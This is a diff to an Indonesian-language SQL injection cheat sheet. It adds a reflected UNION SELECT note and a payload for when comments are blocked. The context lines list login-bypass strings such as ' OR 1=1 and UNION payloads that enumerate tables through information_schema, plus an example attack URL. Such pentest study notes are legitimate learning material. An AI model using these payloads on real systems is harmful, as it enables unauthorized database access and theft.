@@ -9,6 +9,7 @@
 - Comment /*string*/ disebut juga obfusacator, pada MySQL 5.5.30 or higher, sintak berikut `SELECT 1 /*!50530 + 1*/` akan dieksekusi sebagai 2 bukan 1.
 - OOB Channel -> DNS, email, Database connection
 - logical true, hanya bisa menggunakan untuk true saja.
+- union select 'asd' , bisa mereflekskan 'asd' pada HTTP response
 
 ## langkah-langkah
 1. Identifikasi DB apa yang digunakan, salah satu caranya adalah dengan generate error sehaingga server menampilka informasi teknologi. Walaupun server tidak mereturkan error, tapi server selau mereturn databse yang digunakan ketika kita menijectkan payload finding db version.
@@ -36,7 +37,7 @@
 |---|---|
 |Logical True/false|`' OR 1=1` biasaya pake ini<br>`' OR 6=6`<br>`' OR 0x47=0x47`<br>`' OR char(32)=6''`<br>`' OR 6 is not null`<br>`admin' --`<br>`admin' #`<br>`admin'/*`<br>`' or 1=1--`<br>`' or 1=1#`<br>`' or 1=1/*`<br>`') or '1'='1--`<br>`') or ('1'='1--`|
 |`UNION`|`UNION SELECT`<br>`'UNION ALL SELECT`|
-|`+UNION+SELECT+1,2,(table_name),4,5+from+information_schema.tables--+`|`union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=database()—`|
+|`+UNION+SELECT+1,2,(table_name),4,5+from+information_schema.tables--+`|`union select 1,2,group_concat(table_name),4,5 from information_schema.tables where table_schema=database()—`<br>`'union(select('asd');# ->digunakan ketika comment diblok`|
 ```
 http://192.168.2.3/news-and-events.php?id=-22 union select 1,group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema=database()— //extract table name
 ```
